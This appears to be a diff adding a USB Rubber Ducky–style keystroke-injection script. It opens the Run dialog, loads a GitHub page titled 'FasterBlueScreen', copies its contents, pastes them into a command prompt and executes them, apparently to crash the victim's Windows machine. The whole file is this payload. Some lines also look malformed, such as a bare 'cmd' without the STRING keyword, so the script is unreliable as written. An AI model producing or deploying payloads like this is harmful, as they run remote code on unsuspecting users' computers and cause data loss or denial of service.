@@ -1,0 +1,18 @@
+GUI r
+DELAY 100
+STRING https://github.com/ZyLuxx7/ZyLuxx7/blob/main/FasterBlueScreenCode/FasterBlueScreenByZyLuxx7
+ENTER
+DELAY 3500
+CTRL a
+DELAY 100
+CTRL c
+DELAY 100
+GUI r
+DELAY 100
+cmd
+DELAY 100
+CTRL v
+DELAY 100
+ENTER
+DELAY 100
+ENTER
